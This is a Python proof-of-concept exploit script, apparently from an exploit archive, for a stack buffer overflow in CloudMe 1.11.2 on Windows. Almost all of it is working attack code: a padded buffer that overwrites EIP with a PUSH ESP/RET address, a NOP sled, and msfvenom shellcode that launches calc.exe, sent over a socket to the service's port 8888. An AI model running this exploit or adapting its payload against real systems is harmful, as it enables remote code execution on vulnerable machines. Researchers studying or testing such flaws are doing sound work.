# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket
import sys

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xda\xd2\xba\x4f\xc7\xad\x97\xd9\x74\x24\xf4\x58"
payload += b"\x33\xc9\xb1\x31\x83\xc0\x04\x31\x50\x14\x03\x50"
payload += b"\x5b\x25\x58\x6b\x8b\x2b\xa3\x94\x4b\x4c\x2d\x71"
payload += b"\x7a\x4c\x49\xf1\x2c\x7c\x19\x57\xc0\xf7\x4f\x4c"
payload += b"\x53\x75\x58\x63\xd4\x30\xbe\x4a\xe5\x69\x82\xcd"
payload += b"\x65\x70\xd7\x2d\x54\xbb\x2a\x2f\x91\xa6\xc7\x7d"
payload += b"\x4a\xac\x7a\x92\xff\xf8\x46\x19\xb3\xed\xce\xfe"
payload += b"\x03\x0f\xfe\x50\x18\x56\x20\x52\xcd\xe2\x69\x4c"
payload += b"\x12\xce\x20\xe7\xe0\xa4\xb2\x21\x39\x44\x18\x0c"
payload += b"\xf6\xb7\x60\x48\x30\x28\x17\xa0\x43\xd5\x20\x77"
payload += b"\x3e\x01\xa4\x6c\x98\xc2\x1e\x49\x19\x06\xf8\x1a"
payload += b"\x15\xe3\x8e\x45\x39\xf2\x43\xfe\x45\x7f\x62\xd1"
payload += b"\xcc\x3b\x41\xf5\x95\x98\xe8\xac\x73\x4e\x14\xae"
payload += b"\xdc\x2f\xb0\xa4\xf0\x24\xc9\xe6\x9e\xbb\x5f\x9d"
payload += b"\xec\xbc\x5f\x9e\x40\xd5\x6e\x15\x0f\xa2\x6e\xfc"
payload += b"\x74\x5c\x25\x5d\xdc\xf5\xe0\x37\x5d\x98\x12\xe2"
payload += b"\xa1\xa5\x90\x07\x59\x52\x88\x6d\x5c\x1e\x0e\x9d"
payload += b"\x2c\x0f\xfb\xa1\x83\x30\x2e\xc2\x42\xa3\xb2\x2b"
payload += b"\xe1\x43\x50\x34"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
            
